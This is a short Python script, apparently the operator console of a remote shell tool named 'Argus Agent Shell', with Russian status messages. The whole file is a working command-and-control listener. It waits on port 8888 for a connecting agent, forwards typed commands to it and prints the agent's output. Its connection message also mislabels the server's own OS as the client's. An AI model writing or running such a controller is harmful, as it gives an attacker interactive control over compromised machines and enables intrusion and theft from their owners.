import socket
from colorama import Fore, Style
import shutil
from platform import system

HOST = ''
PORT = 8888

width = shutil.get_terminal_size().columns
print('=' * width)
print(Style.BRIGHT + Fore.MAGENTA + "     A R G U S  A G E N T  S H E L L 👁  v. 1.0\n".center(width) + Style.RESET_ALL)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
    soc.bind((HOST, PORT))
    soc.listen(5)
    print(Fore.GREEN + "\n[+] Сервер ожидает входящего подключения..." + Style.RESET_ALL)

    client_connection, client_addr = soc.accept()
    print(Fore.GREEN + f"[+] Установлено соединение с: {client_addr} ОС: {system()}" + Style.RESET_ALL)

    with client_connection:
        while True:
            command = input(Style.BRIGHT + '\nВведите команду:\n> ' + Style.RESET_ALL)

            if command.lower() == 'exit':
                print(Fore.GREEN + '[*] Завершение соединения\n' + Style.RESET_ALL)
                break

            if not command:
                continue

            try:
                output = command.encode('utf-8')
                client_connection.sendall(output)
                data_from_client = client_connection.recv(4096).decode('utf-8')
                print(Fore.GREEN + '\n' + data_from_client.strip() + Style.RESET_ALL)
            except Exception as err:
                print(Fore.RED + f"[!] Ошибка: {err}" + Style.RESET_ALL)
                exit()

print('=' * width)